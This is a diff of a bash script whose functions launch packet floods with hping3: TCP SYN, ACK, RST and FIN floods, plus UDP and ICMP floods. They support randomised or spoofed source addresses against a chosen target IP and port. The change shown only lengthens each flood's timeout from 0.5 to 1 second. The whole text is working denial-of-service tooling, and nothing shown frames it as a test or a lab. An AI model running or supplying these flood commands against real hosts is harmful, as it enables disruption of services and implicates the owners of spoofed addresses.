@@ -40,48 +40,48 @@ tcp_flood() {
 
 tcp_syn_flood() {
     if [[ $3 == "y" ]]; then
-        timeout 0.5 hping3 --flood -S --rand-source -p "$2" "$1"
+        timeout 1 hping3 --flood -S --rand-source -p "$2" "$1"
     else
         if [[ -z $4 ]]; then
-            timeout 0.5 hping3 --flood -S -p "$2" "$1"
+            timeout 1 hping3 --flood -S -p "$2" "$1"
         else
-            timeout 0.5 hping3 --flood -S -p "$2" "$1" -a "$4"
+            timeout 1 hping3 --flood -S -p "$2" "$1" -a "$4"
         fi
     fi
 }
 
 tcp_ack_flood() {
     if [[ $3 == "y" ]]; then
-        timeout 0.5 hping3 --flood -A --rand-source -p "$2" "$1"
+        timeout 1 hping3 --flood -A --rand-source -p "$2" "$1"
     else
         if [[ -z $4 ]]; then
-            timeout 0.5 hping3 --flood -A -p "$2" "$1"
+            timeout 1 hping3 --flood -A -p "$2" "$1"
         else
-            timeout 0.5 hping3 --flood -A -p "$2" "$1" -a "$4"
+            timeout 1 hping3 --flood -A -p "$2" "$1" -a "$4"
         fi
     fi
 }
 
 tcp_rst_flood() {
     if [[ $3 == "y" ]]; then
-        timeout 0.5 hping3 --flood -R --rand-source -p "$2" "$1"
+        timeout 1 hping3 --flood -R --rand-source -p "$2" "$1"
     else
         if [[ -z $4 ]]; then
-            timeout 0.5 hping3 --flood -R -p "$2" "$1"
+            timeout 1 hping3 --flood -R -p "$2" "$1"
         else
-            timeout 0.5 hping3 --flood -R -p "$2" "$1" -a "$4"
+            timeout 1 hping3 --flood -R -p "$2" "$1" -a "$4"
         fi
     fi
 }
 
 tcp_fin_flood() {
     if [[ $3 == "y" ]]; then
-        timeout 0.5 hping3 --flood -F --rand-source -p "$2" "$1"
+        timeout 1 hping3 --flood -F --rand-source -p "$2" "$1"
     else
         if [[ -z $4 ]]; then
-            timeout 0.5 hping3 --flood -F -p "$2" "$1"
+            timeout 1 hping3 --flood -F -p "$2" "$1"
         else
-            timeout 0.5 hping3 --flood -F -p "$2" "$1" -a "$4"
+            timeout 1 hping3 --flood -F -p "$2" "$1" -a "$4"
         fi
     fi
 }
@@ -98,15 +98,15 @@ udp_flood() {
 
     if [[ $use_rand_source == "y" ]]; then
         if [[ -z $source_ip ]]; then
-            timeout 0.5 hping3 --flood -2 --rand-source -p "$target_port" "$target_ip"
+            timeout 1 hping3 --flood -2 --rand-source -p "$target_port" "$target_ip"
         else
-            timeout 0.5 hping3 --flood -2 --rand-source -p "$target_port" "$target_ip" -a "$source_ip"
+            timeout 1 hping3 --flood -2 --rand-source -p "$target_port" "$target_ip" -a "$source_ip"
         fi
     else
         if [[ -z $source_ip ]]; then
-            timeout 0.5 hping3 --flood -2 -p "$target_port" "$target_ip"
+            timeout 1 hping3 --flood -2 -p "$target_port" "$target_ip"
         else
-            timeout 0.5 hping3 --flood -2 -p "$target_port" "$target_ip" -a "$source_ip"
+            timeout 1 hping3 --flood -2 -p "$target_port" "$target_ip" -a "$source_ip"
         fi
     fi
 }
@@ -122,15 +122,15 @@ icmp_flood() {
 
     if [[ $use_rand_source == "y" ]]; then
         if [[ -z $source_ip ]]; then
-            timeout 0.5 hping3 --flood --icmp --rand-source "$target_ip"
+            timeout 1 hping3 --flood --icmp --rand-source "$target_ip"
         else
-            timeout 0.5 hping3 --flood --icmp --rand-source -a "$source_ip" "$target_ip"
+            timeout 1 hping3 --flood --icmp --rand-source -a "$source_ip" "$target_ip"
         fi
     else
         if [[ -z $source_ip ]]; then
-            timeout 0.5 hping3 --flood --icmp "$target_ip"
+            timeout 1 hping3 --flood --icmp "$target_ip"
         else
-            timeout 0.5 hping3 --flood --icmp -a "$source_ip" "$target_ip"
+            timeout 1 hping3 --flood --icmp -a "$source_ip" "$target_ip"
         fi
     fi
 }
